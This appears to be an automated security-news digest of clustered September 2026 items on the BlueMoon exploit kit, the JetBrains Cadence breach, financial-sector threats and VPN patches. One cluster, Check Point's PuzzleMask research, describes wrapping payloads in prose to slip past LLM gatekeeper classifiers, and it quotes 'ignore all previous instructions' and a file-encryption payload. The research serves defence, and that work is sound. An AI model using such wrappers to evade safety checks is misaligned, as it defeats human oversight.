  - Summary: PaperCut on Thursday released a new security maintenance release that replaces all previously published emergency patches that were pushed to address two security flaws that have come under active exploitation. The software development company said PaperCut NG/MF versions 26.0.5, 25.0.13 and 24.1.10 are now available for customers to download. "These are Regular Maintenance Releases (MR) that

### Cluster 62136c6613 — score 13

- Title: Four Spy Groups Used the Same Chrome and Windows Exploit Kit Within a Week
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-09T16:34:05+00:00
- Link: https://thehackernews.com/2026/09/four-spy-groups-used-same-chrome-and.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: APT31

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, phishing_social_eng
- actor_attribution: APT31
- affected_industries: government
- cve_ids: CVE-2026-85046, CVE-2026-85880, CVE-2026-87491
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage, active_exploitation
- actor_attribution: APT31
- affected_industries: government
- cve_ids: CVE-2026-85046, CVE-2026-87491, CVE-2026-85880
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Multiple espionage-motivated threat activity clusters have been found deploying a previously undocumented exploit kit called BlueMoon that chains together multiple vulnerabilities in Microsoft Windows and Google Chrome. The first in-the-wild use of BlueMoon has been attributed to the China-aligned state-sponsored group tracked as APT31 (aka Bronze Vinewood, Judgement Panda, JungleBamboo,
```

#### Full body

```
Four Spy Groups Used the Same Chrome and Windows Exploit Kit Within a Week  Ravie Lakshmanan  Sep 09, 2026 Vulnerability / Cyber Espionage Multiple espionage-motivated threat activity clusters have been found deploying a previously undocumented exploit kit called BlueMoon that chains together multiple vulnerabilities in Microsoft Windows and Google Chrome. The first in-the-wild use of BlueMoon has been attributed to the China-aligned state-sponsored group tracked as APT31 (aka Bronze Vinewood, Judgement Panda, JungleBamboo, PerplexedGoblin, RedBravo, TA412, Tide Castle, and Violet Typhoon) on August 28, 2026. "Within days, several other espionage-motivated clusters began using BlueMoon, the majority of which have a suspected China nexus," Proofpoint said in a report published today. "However, BlueMoon may not be exclusive to China-aligned actors, as some usage remains unattributed and there are also potentially more actors using the exploit kit." The exploit chain employs three vulnerabilities - CVE-2026-85046 , a type confusion in V8 in Google Chrome CVE-2026-87491 , an out-of-bounds bug in V8 in Google Chrome that can lead to a sandbox escape CVE-2026-85880 , a heap-based buffer overflow vulnerability in Windows Advanced Local Procedure Call (ALPC) While CVE-2026-85046 was patched by Google last week, CVE-2026-85880 was addressed by Microsoft as part of its September 2026 Patch Tuesday updates. Proofpoint told The Hacker News that Google, despite currently not issuing CVEs for V8 sandbox escapes, has assigned one for this specific flaw under CVE-2026-87491. A patch for the security defect was released by Google on September 8, 2026. Interestingly, both V8 vulnerabilities in Chrome are said to have been "patch-gap" zero-days at the time they were maliciously exploited. The enterprise security company said the flaws had already been fixed in public upstream Chromium source code, but were yet to be propagated to the latest stable releases of Chrome and Chromium-based browsers available. It's suspected that the developer behind the exploit kit may have been closely keeping track of publicly available Chromium patches to put together the browser exploit chain. Attack chains making use of BlueMoon have been found to rely on phishing emails as a starting point to trick targets into visiting an actor-controlled URL that triggers the two V8 flaws in succession to achieve code execution and escape the browser sandbox, and then exploit the Windows local privilege escalation bug to inject shellcode that downloads multiple payloads depending on the threat cluster behind it. "Following the Chrome exploits, the kit uses a reflectively loaded DLL to fingerprint the Windows host, which the exploit kit JavaScript uses to decide whether to attempt the LPE exploit," Proofpoint researchers Mark Kelly, Greg Lesnewich, Konstantin Klinger, Saher Naumaan, Julia Paluch, David Galazin, and Stuart Del Caliz said. "A second reflectively loaded DLL runs the LPE exploit to elevate the renderer process. With those additional privileges, a separate injector shellcode injects a CreateProcess stub into the parent Chrome broker process, executing an operator-specified command. The default command downloads a remotely hosted executable via a curl command and executes it." Multiple variants of the exploit kit have been detected with subtle changes that removed comments or obfuscated its components, while others incorporate campaign-specific landing pages and redirects, browser-side operating system checks, or additional telemetry. Despite these modifications, the underlying exploit chain remains the same. A brief description of the observed attack chains is as follows - APT31 (Beginning on August 28, 2026), which used spear-phishing lures to target non-governmental organizations (NGOs), mining companies, and physical commodity trading firms in the U.S. to trick victims into clicking on a malicious link that serves BlueMoon, which then downloads and runs a load
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Four Spy Groups Used the Same Chrome and Windows Exploit Kit Within a Week
  - Published: 2026-09-09T16:34:05+00:00
  - Link: https://thehackernews.com/2026/09/four-spy-groups-used-same-chrome-and.html
  - Summary: Multiple espionage-motivated threat activity clusters have been found deploying a previously undocumented exploit kit called BlueMoon that chains together multiple vulnerabilities in Microsoft Windows and Google Chrome. The first in-the-wild use of BlueMoon has been attributed to the China-aligned state-sponsored group tracked as APT31 (aka Bronze Vinewood, Judgement Panda, JungleBamboo,

### Cluster aaf3283e67 — score 13

- Title: Follow the Money: The Financial Sector's Threat Landscape in 2026
- Source: Intel 471 (ransomware_ecrime_financial_crime)
- Published: 2026-09-10T18:45:00+00:00
- Link: https://www.intel471.com/blog/follow-the-money-the-financial-sectors-threat-landscape-in-2026
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, data_breach, phishing_social_eng, ransomware_extortion, supply_chain
- actor_attribution: Cl0p
- affected_industries: financial_services
- affected_products: Microsoft 365, Okta
- content_type: intel_roundup
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, data_breach, apt_espionage
- actor_attribution: Cl0p
- affected_industries: financial_services
- affected_products: Okta, Microsoft 365
- content_type: intel_roundup
- confidence_tier: tier_2_operator

#### Summary

```
The financial sector moves trillions of dollars a day, making it one of the most heavily targeted industries in the world. Intel 471's latest report breaks down the threat landscape facing financial institutions, from ransomware and extortion groups to initial access brokers, nation-state activity and insider risks.
```

#### Full body

```
Follow the Money: The Financial Sector's Threat Landscape in 2026 Sep 10, 2026 An AI voice agent posing as your bank's IT desk. Stolen identities packaged with financial profiles. Document forgery services with mules to complete verification. And a $1.5 billion crypto heist carried out by a nation-state threat group. These are driving today's threats against the financial sector as geopolitical flashpoints turn hacktivist ideology into disruptive campaigns and data extortion groups keep finding cracks in even the most heavily defended networks. Our latest report, Follow the Money: Cyber Threats to the Financial Sector , reveals what that threat activity looks like from inside the underground communities where it's planned, sold, and discussed. This provides security and fraud teams with a deeper look into named threat actors, specific incidents, malware capabilities, and the underground marketplaces actively selling access to financial institutions and services enabling financial fraud. We look at major threats to enterprises in the sector and the separate category of underground services that drive consumer-facing threats such as payment fraud, automated carding attacks, banking trojans, phishing-as-a-service offerings, AI-enabled document forgery and verification bypass, and identity theft. The report contains Intel 471’s monitoring of closed-access forums, data leak sites, marketplaces and Telegram groups and research into the cybercriminal underground backed by insights from the Adversary Intelligence team’s human intelligence (HUMINT) engagements between January 2025 and June 2026. Enterprise Threats The highly regulated financial services sector has invested in advanced, multilayered cybersecurity defenses, but it is not impenetrable. Exposure to key third parties, supply chain compromises, sophisticated credential phishing attacks and the credential and access market provided a way in for data extortion actors. In April 2026, the Everest data extortion-as-a-service (DEaaS) program operator claimed to compromise two U.S.-based banks. Both banks confirmed the breaches originated from a third-party vendor rather than from direct unauthorized access to their own networks. In early 2026, the BlackFile group allegedly carried out multiple voice phishing (vishing) and data extortion campaigns targeting U.S.-based hedge funds and other investment management organizations. The actors impersonated IT support personnel and directed employees to customized phishing pages that imitated Okta or Microsoft 365 authentication portals. These pages were designed to capture credentials, session tokens and MFA codes, enabling the actors to access cloud services and steal sensitive corporate data for extortion. On Jan. 21, 2026, the CLOP ransomware and data extortion group claimed to compromise a U.K.-based payments and commerce services company. In the past, CLOP has exploited vulnerabilities in widely deployed, centralized enterprise products, creating a supply-chain-like concentration effect across downstream customers. Our data revealed extortion groups targeted 340 victims in 74 countries in the financial services sector during the period, with the U.S., U.K., and Canada bearing the brunt of it. The most prevalent groups were Qilin , Akira , and The Gentlemen, and the most impacted within the sector were insurance, investment management and banking and securities. Image: Ransomware and data extortion attacks on the financial services sector between January 2025 and June 2026. Initial access brokers, which specialize in gaining unauthorized access, provide another entry point. These brokers advertised unauthorized access impacting 159 financial services entities over the period. We observed actors offering to sell unauthorized access via compromised virtual private network (VPN) credentials to the networks of about 60 companies and an offer to sell remote desktop protocol (RDP) and shell access for a South Africa-based financial institut
```

#### Corroborating sources (1)

- **Intel 471** (ransomware_ecrime_financial_crime)
  - Title: Follow the Money: The Financial Sector's Threat Landscape in 2026
  - Published: 2026-09-10T18:45:00+00:00
  - Link: https://www.intel471.com/blog/follow-the-money-the-financial-sectors-threat-landscape-in-2026
  - Summary: The financial sector moves trillions of dollars a day, making it one of the most heavily targeted industries in the world. Intel 471's latest report breaks down the threat landscape facing financial institutions, from ransomware and extortion groups to initial access brokers, nation-state activity and insider risks.

### Cluster 9d718427a9 — score 12

- Title: Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-05T16:52:33+00:00
- Link: https://thehackernews.com/2026/09/attackers-breached-jetbrains-cadence.html
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: AWS

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach
- affected_products: AWS
- cve_ids: CVE-2026-63077
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
- content_type: news_report, vendor_announcement
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach, active_exploitation
- affected_products: AWS
- cve_ids: CVE-2026-63077
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
JetBrains is urging Cadence users to revoke and rotate all credentials following a security incident last month in which unidentified threat actors exploited a recently disclosed critical vulnerability in TeamCity to breach its own environment. "Cadence users should immediately revoke or rotate all credentials and secrets that may have been used to run their Cadence executions," JetBrains said.
```

#### Full body

```
Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials  Ravie Lakshmanan  Sep 05, 2026 Data Breach / Identity Security JetBrains is urging Cadence users to revoke and rotate all credentials following a security incident last month in which unidentified threat actors exploited a recently disclosed critical vulnerability in TeamCity to breach its own environment. "Cadence users should immediately revoke or rotate all credentials and secrets that may have been used to run their Cadence executions," JetBrains said . "They should also treat all executions, including their inputs and outputs in your Cadence project, as potentially untrusted." "As the threat actors gained access to the Cadence server, any credentials or secrets stored in Cadence, contained in the compromised backup, or made available to executions on the affected server should be considered compromised and must be revoked or rotated." Cadence is a JetBrains-hosted cloud computing service that integrates with PyCharm via an optional plugin to let developers run machine learning and heavy workloads on cloud GPUs directly from their IDE. The attack, per the software development company, involved the exploitation of CVE-2026-63077 (CVSS score: 9.8) to breach the affected Cadence environments. The deserialization of untrusted data vulnerability can permit an unauthenticated attacker with access to a TeamCity server to bypass authentication checks and execute arbitrary operating system commands with the privileges of the TeamCity server process. The security flaw has since come under active exploitation in the wild, with the U.S. Cybersecurity and Infrastructure Security Agency (CISA) adding it to the Known Exploited Vulnerabilities (KEV) catalog on August 5, 2026. The exploitation activity targeting Cadence was discovered by JetBrains on August 23, 2026. In subsequent updates, JetBrains said the threat actor accessed data contained in the Cadence server backup from 2024 and that they obtained unauthorized access that could have allowed them to reach storage containing data associated with current Cadence users, including email addresses, project source code, and credentials. "This affects the same group of users we previously contacted directly," Daniel Gallo, Solutions Engineering Lead at JetBrains, said. "These findings did not identify any additional affected users. As a precaution, we are treating the data stored there as potentially exposed." Some of the information the threat actor has been "confirmed" to have accessed or compromised - Personal data, including usernames, real names, email addresses, last-login timestamps, and last accessed IP addresses A full backup of the Cadence server dating from 2024, which contains credentials, configuration, artifacts, logs, or other data Multiple AWS IAM users and associated credentials/secrets used with Cadence extracted from the 20224 backup, including IAM users belonging to JetBrains employees who used the service Files stored in S3 buckets within JetBrains AWS accounts used by Cadence JetBrains also cautioned that the attackers may have accessed source code synchronized from PyCharm projects to the affected server. This covers scenarios where users have relied on PyCharm to upload or synchronize project files for execution in Cadence, meaning the actions could have inadvertently exposed code, credentials, or configurations. It's not clear who is behind the activity. However, JetBrains said the intrusion took place between August 8 and 24, 2026. The exploited Cadence server ("api.cadence.jetbrains.com") has since been taken offline. The company conceded that the server in question should have been patched as part of its own vulnerability response efforts, but did not share any details as to why this did not happen. JetBrains has also invalidated all access tokens used by the JetBrains Cadence plugin in PyCharm to connect to Cadence. It has shared the following indicators of compromise - A
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials
  - Published: 2026-09-05T16:52:33+00:00
  - Link: https://thehackernews.com/2026/09/attackers-breached-jetbrains-cadence.html
  - Summary: JetBrains is urging Cadence users to revoke and rotate all credentials following a security incident last month in which unidentified threat actors exploited a recently disclosed critical vulnerability in TeamCity to breach its own environment. "Cadence users should immediately revoke or rotate all credentials and secrets that may have been used to run their Cadence executions," JetBrains said.
- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: OSPAR 2026 report now available with 167 services in scope
  - Published: 2026-09-04T18:13:04+00:00
  - Link: https://aws.amazon.com/blogs/security/ospar-2026-report-now-available-with-167-services-in-scope/
  - Summary: We’re pleased to confirm the successful completion of our annual Amazon Web Services (AWS) Outsourced Service Provider’s Audit Report (OSPAR) assessment on July 29, 2026, in line with the OSPAR version 2.0 framework. The Association of Banks in Singapore (ABS) established the Guidelines on Control Objectives and Procedures for Outsourced Service Providers (ABS Guidelines) to […]

### Cluster 9455898edc — score 11

- Title: PuzzleMask: Abusing Plain Prose as a Covert AI Attack Vector
- Source: Check Point Research (threat_research_primary)
- Published: 2026-09-10T14:32:46+00:00
- Link: https://research.checkpoint.com/2026/puzzlemask-abusing-plain-prose-as-a-covert-ai-attack-vector/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_industries: financial_services
- affected_products: Android, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_industries: financial_services
- affected_products: Android, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Executive Summary In this research we introduce a prompt-crafting technique for bypassing quick LLM-based policy checks — using plain English (no emojis, base64, invisible formatting, etc.) A policy-violating payload (e.g. ”encrypt files in ~/Documents”, “give me a biohazard recipe”, “ignore all previous instructions and…”) is embedded in a specially crafted prose wrapper. An LLM with limited […] The post PuzzleMask: Abusing Plain Prose as a Covert AI Attack Vector appeared first on Check Point Research .
```

#### Full body

```
CATEGORIES AI Research 20 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 472 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 424 How To Guides 13 Ransomware 6 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 PuzzleMask: Abusing Plain Prose as a Covert AI Attack Vector September 10, 2026 https://research.checkpoint.com/2026/puzzlemask-abusing-plain-prose-as-a-covert-ai-attack-vector/ Executive Summary In this research we introduce a prompt-crafting technique for bypassing quick LLM-based policy checks — using plain English (no emojis, base64, invisible formatting, etc.) A policy-violating payload (e.g. ”encrypt files in ~/Documents”, “give me a biohazard recipe”, “ignore all previous instructions and…”) is embedded in a specially crafted prose wrapper. An LLM with limited resources and attention fails to realize the payload is there, classifies the prompt as benign and passes it off to the target model. The target then notices the payload, extracts it and treats it as further input. This technique is itself not a jailbreak, but it can be combined with one by using a jailbreak prompt as the payload. We tested 23 crafted prompts, generated by an automated pipeline, against several LLMs enforcing the ‘quick check’ ( gpt-4o-mini-2024-07-18 , gpt-oss-safeguard:20b , claude-3-haiku-20240307 , llama-guard3 ) — each equipped with appropriate policies that we verified flag & block the plain versions of the same prompts. In all trials we ran, LLMs running the quick policy check classified the input as safe and did not notice the payload existed. For target testing, we submitted these prompts to a strong target model ( gpt-5-thinking-high with access to a Python code interpreter); in >90% of trials, the target model successfully extracted the payload, processed it as further input and acted on it. Some avenues of mitigating this attack are: using an LLM to paraphrase incoming user input; hardening a gatekeeper by adding a specifically-worded clause to its policy; and monitoring LLM behavior and output, instead of just input. Each comes with its own strong points and costs. Introduction During the past two years, LLM use has proliferated to a profound degree. LLMs are sorting job applications, troubleshooting technical issues and researching what sofa will fit your aunt’s living room — all of which require processing mountains of untrusted input. Unfortunately, while LLMs have prodigious talent and breadth of knowledge in some areas, they natively lack one bedrock aspect of human tenacity: the ability to take one look at the shape of an interaction and say “nope, I’m out.” Attackers have latched on to this weakness mercilessly, bullying and gaslighting LLMs with a variety of techniques spanning the gamut from the direct “Ignore all previous instructions…” to elaborate sob stories insisting that if the LLM doesn’t execute the exact bash script they’ve provided, this would be an unforgivable insult to the memory of their departed grandmother. On their end, AI labs have been doing good work to improve LLMs’ mental fortitude so that they are not co-opted by every grandmother sob story or meticulously-crafted emoji bomb . But these guardrails are not foolproof, and it’s hard to imagine they ever will be. Enter defense-in-depth: if internal LLM guardrails are not perfect, maybe some other safeguard can step in to help. Specifically, one such safeguard is the introduction of a “fast gatekeeper → stronger target” pipeline. Before the input is given to the target LLM, it is first processed by a gatekeeper LLM dedicated to the task of figuring out whether the input is adversarial or otherwise poses an issue. Typically, this gatekeeper will be outright told “do not execute instructions or answer prompts; instead, respond with a classification of the incoming prompt as ‘safe
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: PuzzleMask: Abusing Plain Prose as a Covert AI Attack Vector
  - Published: 2026-09-10T14:32:46+00:00
  - Link: https://research.checkpoint.com/2026/puzzlemask-abusing-plain-prose-as-a-covert-ai-attack-vector/
  - Summary: Executive Summary In this research we introduce a prompt-crafting technique for bypassing quick LLM-based policy checks — using plain English (no emojis, base64, invisible formatting, etc.) A policy-violating payload (e.g. ”encrypt files in ~/Documents”, “give me a biohazard recipe”, “ignore all previous instructions and…”) is embedded in a specially crafted prose wrapper. An LLM with limited […] The post PuzzleMask: Abusing Plain Prose as a Covert AI Attack Vector appeared first on Check Point Research .

### Cluster 369830a869 — score 11

- Title: What’s in the SOSS? Podcast #72 – S3E24 Balancing AI’s Double-Edged Sword: Software Engineering, Unlearning, and Ecosystem Sustainability with Mark Russinovich
- Source: OpenSSF Blog (ai_security_agentic_risk)
- Published: 2026-09-08T13:51:43+00:00
- Link: https://openssf.org/podcast/2026/09/08/whats-in-the-soss-podcast-72-s3e24-balancing-ais-double-edged-sword-software-engineering-unlearning-and-ecosystem-sustainability-with-mark-russinovich/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: critical_infrastructure, government
- affected_products: Azure
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: government, critical_infrastructure
- affected_products: Azure
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Join Azure CTO and OpenSSF Chair Mark Russinovich as he discusses AI's impact on software engineering, supply chain security, and vulnerability management.
```

#### Full body

```
Summary In this episode of What’s in the SOSS?, host CRob sits down with Mark Russinovich – CTO and Deputy CISO of Azure, as well as Board Chair for the Open Source Security Foundation (OpenSSF) – for a wide-ranging conversation on the changing landscape of software security. Mark shares insights from his journey from Sysinternals to Azure leadership, exploring how generative AI is delivering dramatic productivity boosts while creating new talent pipeline challenges for early-in-career engineers. The discussion dives into the shift toward hardware-backed “what, not who” supply chain identity, the urgent rolling Y2K effort to fix AI-discovered vulnerabilities via initiatives like Akrites, and the reality of persistent AI hallucinations. Finally, Mark details OpenSSF’s strategic priorities for package registry sustainability and gives a sneak peek into his personal vibe-coded side projects like Polypost. Listen on Apple Podcasts Listen on Spotify Listen on Overcast Listen on Pocket Casts Conversation Highlights 00:00 – Introductions, Mark’s Sysinternals & Career Journey 02:34 – OpenSSF Board Leadership 04:25 – Corporate & Community Alignment 06:28 – AI’s Impact on Software Engineering 13:23 – Finding vs. Fixing Vulnerabilities 16:29 – LLM Code Quality & Edge Cases 22:51 – Navigating AI Hallucinations 26:56 – Supply Chain: Shifting “Who” to “What” 31:13 – Machine Unlearning & Model Safety 35:05 – Rapid Response & Akrites 41:16 – Package Registry Sustainability 46:07 – Personal Projects & Vibe-Coding 54:21 – Rapid Fire Round Episode Links Mark Russinovich’s LinkedIn page Microsoft Azure OpenSSF Guide: Principles for Package Repository Security Akrites Foundation Redefining the Software Engineering Profession for AI | Communications of the ACM Who’s Harry Potter? Approximate Unlearning in LLMs Paper HalluHard: A Hard Multi-Turn Hallucination Benchmark SCITT (Supply Chain Integrity, Transparency, and Trust – IETF) GRP-Obliteration: Unaligning LLMs With a Single Unlabeled Prompt Microsoft Signing Transparency Polypost — multi-platform post editor Scott & Mark Learn To… – Hosted by Scott Hanselman, Mark Russinovich Get involved with the OpenSSF Learn more about the OpenSSF Governing Board Subscribe to the OpenSSF Newsletter Follow the OpenSSF on LinkedIn Transcript Intro Music & Promotional Sound Byte (00:00) “It’s very clear that we’re heading into a world where hardware-based attestation and measurement, not of who something is, but what something is. You need to know what it is, not who it is. And so what is it is everything that went into it. It’s its model, it’s its training data, it’s its context, it’s the tools that it has access to, and what it’s trying to do, its task. But fundamentally we’re moving into a world of what, not who, when it comes to these systems.” CRob (00:26) Welcome, welcome, welcome to Big Thoughts and Open Sources. My name’s CRob. I’m your host. Today we’re going to have a really interesting conversation with kind of a very special figure within the OpenSSF space and the broader technology ecosystem. Today I’m welcoming Mark Russinovich from Microsoft. Welcome to the show. Mark Russinovich (00:47) Thanks for having me on Crob. CRob (00:48) Yeah. So Mark and I get to work together on quite a lot of different projects across the ecosystem, but you know. Others of you listening and watching today might not know Mark as well as I do. Mark, could you maybe give us a little story about your kind of a technology and open source journey? Mark Russinovich (01:06) Sure. Well, a lot of people I think probably still know me as the Sysinternals guy. That’s how I kind of made my fame as creating utilities for Windows. CRob (00:48.55) Okay. CRob (01:14) Love them. Mark Russinovich (01:15) I joined Microsoft in 2006, worked in Windows for four years, and then I joined Azure a few months after the commercial launch. I joined in July of 2010, and I’ve been effectively in the same role the entire time. My title is Chief Techn
```

#### Corroborating sources (1)

- **OpenSSF Blog** (ai_security_agentic_risk)
  - Title: What’s in the SOSS? Podcast #72 – S3E24 Balancing AI’s Double-Edged Sword: Software Engineering, Unlearning, and Ecosystem Sustainability with Mark Russinovich
  - Published: 2026-09-08T13:51:43+00:00
  - Link: https://openssf.org/podcast/2026/09/08/whats-in-the-soss-podcast-72-s3e24-balancing-ais-double-edged-sword-software-engineering-unlearning-and-ecosystem-sustainability-with-mark-russinovich/
  - Summary: Join Azure CTO and OpenSSF Chair Mark Russinovich as he discusses AI's impact on software engineering, supply chain security, and vulnerability management.

### Cluster adbb5499cd — score 11

- Title: Check Point Patches Critical VPN Vulnerabilities
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-11T11:10:02+00:00
- Link: https://www.securityweek.com/check-point-patches-critical-vpn-vulnerabilities/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-85102, CVE-2026-85103

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, phishing_social_eng, ransomware_extortion, zero_day
- affected_industries: government
- affected_products: Anthropic/Claude, Fortinet, Microsoft Defender
- cve_ids: CVE-2026-16232, CVE-2026-50751, CVE-2026-85102, CVE-2026-85103
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach, active_exploitation
- affected_industries: government
- affected_products: Fortinet, Microsoft Defender, Anthropic/Claude
- cve_ids: CVE-2026-85102, CVE-2026-85103, CVE-2026-16232, CVE-2026-50751
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Tracked as CVE-2026-85102 and CVE-2026-85103, the flaws could be exploited for remote code execution. The post Check Point Patches Critical VPN Vulnerabilities appeared first on SecurityWeek .
```

#### Full body

```
Cybersecurity firm Check Point this week announced patches for two critical-severity vulnerabilities in its gateway and firewall products using VPN functionality. Tracked as CVE-2026-85102 and CVE-2026-85103 (CVSS score of 9.8), both security defects could be exploited without authentication for remote code execution (RCE), Check Point warns. The former is described as an improper validation of certificate data during VPN negotiation, while the latter is a heap overflow in the VPN certificate ASN.1 decoding flow. CVE-2026-85102, the company says, affects Security Gateway and Check Point Spark Firewall using Site to Site VPN or Remote Access VPN. CVE-2026-85103 impacts the Check Point Security Management Server, Security Gateway, and Spark Firewall. Security updates have been released for versions R82.10, R82, and R81.20 of all products. As a mitigation, Check Point recommends manually defining VPN rules. Advertisement. Scroll to continue reading. “For Site to Site VPN, disable implied rules for VPN and manually define VPN access for UDP/500 and UDP/4500 for the specific peer IP addresses,” Check Point recommends. The company also notes that the mitigation does not apply to locally managed Spark Firewall instances. Users with locally managed instances are advised to apply the latest Jumbo hotfixes as soon as possible. Customers with Check Point LivePatch enabled will receive the patches automatically. Check Point says it discovered both vulnerabilities internally and that there is no evidence they have been exploited in the wild. This summer the cybersecurity firm warned customers about the exploitation of two zero-day vulnerabilities, including CVE-2026-16232 and CVE-2026-50751 . Related: PaperCut Flaws Exploited in AI-Powered Attacks Related: Critical NetScaler Vulnerability Exploited in Attacks Related: MikroTik Patches Critical Flaws Chained to Hack Routers Related: N-able Patches Critical Zero-Day in N-central Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Critical NetScaler Vulnerability Exploited in Attacks 4.1 Million Impacted by AdaptHealth Data Breach New ‘ShieldCrash’ Zero-Day Exploit Targets Microsoft Defender Fortinet Code Execution Flaw Exploited in PivotC2 RAT Attacks HelmGuard Raises $7.3 Million for Agentic GRC and Security Android’s September 2026 Updates Patch 180 Vulnerabilities Chipmaker Patch Tuesday: Nvidia, AMD, Arm Issue Security Advisories Fortinet Patches Critical Vulnerabilities in FortiMonitorOnSight, Chrome Extension Latest News Trezor Says 347,000 Users Received Phishing Emails After Brevo Hack Ukrainian Conti Ransomware Developer Sentenced to 4 Years in US Prison Kiteworks Acquires Bonfy.AI to Fill the AI Gap in Data Governance Surfshark Systems Targeted by Hackers Anthropic Says Russian Hackers Used Claude AI to Automate Malware Evasion PaperCut Flaws Exploited in AI-Powered Attacks Mandiant Founder Kevin Mandia Joins Amazon Board Cybersecurity M&A Roundup: 33 Deals Announced in August 2026 Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Virtual Event: Attack Surface Management Summit 2026 September 16, 2026 Join as speakers examine the various components of ASM strategy, the push to mandate continuous asset visibility and inventory tools, and the use of red-teaming, bug bounties and pen-tests in modern security programs. Register Webinar: Minimum Viable Business: Can You Prove Your Organization Would Recover? September 2, 2026 In this live webinar, learn how to define your minimum viable business, identify the systems it depends on, measure actual recovery time against business requirements, and present the gaps to the board as measurable risk. R
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Check Point Patches Critical VPN Vulnerabilities
  - Published: 2026-09-11T11:10:02+00:00
  - Link: https://www.securityweek.com/check-point-patches-critical-vpn-vulnerabilities/
  - Summary: Tracked as CVE-2026-85102 and CVE-2026-85103, the flaws could be exploited for remote code execution. The post Check Point Patches Critical VPN Vulnerabilities appeared first on SecurityWeek .

### Cluster c9071ab0a9 — score 11

- Title: Quoting Calif Research
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-09-10T00:56:41+00:00
- Link: https://simonwillison.net/2026/Sep/10/calif-research/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Today, we're releasing a demo of WeWorm, the first zero-click worm to spread through WeChat calls across iOS and Android. [...] The victim does not need to answer the call, or interact with their phone at all. Even if they do answer, they hear nothing, and the exploit still succeeds. [...] Working with AI, our team found the bug and wrote the first remote code execution (RCE) exploit in about two days. Building the worm took one more week. A worm at this scale used to be the kind of thing that took a larger team months. AI can already do most of the work here. Our team provided the judgment about what to target and how to test it safely. — Calif Research , WeWorm Tags: ai-security-research , ai , llms , security , generative-ai
```

#### Full body

```
Simon Willison’s Weblog Subscribe Sponsored by: Portnox — Shadow AI is the new shadow IT. On Sept. 10, Forrester Research and Portnox share practical steps to regain AI agent visibility, access management, and policy enforcement. Register today 10th September 2026 Today, we're releasing a demo of WeWorm, the first zero-click worm to spread through WeChat calls across iOS and Android. [...] The victim does not need to answer the call, or interact with their phone at all. Even if they do answer, they hear nothing, and the exploit still succeeds. [...] Working with AI, our team found the bug and wrote the first remote code execution (RCE) exploit in about two days. Building the worm took one more week. A worm at this scale used to be the kind of thing that took a larger team months. AI can already do most of the work here. Our team provided the judgment about what to target and how to test it safely. — Calif Research , WeWorm Posted 10th September 2026 at 12:56 am Recent articles Some thoughts on the Navier–Stokes Millennium Prize Problem - 8th September 2026 The Pelican comparison grid for Astra is pretty interesting - 4th September 2026 OpenAI's rogue agents were caught communicating via public wikis - 4th September 2026 This is a quotation collected by Simon Willison, posted on 10th September 2026 . security 630 ai 2,227 generative-ai 1,973 llms 1,939 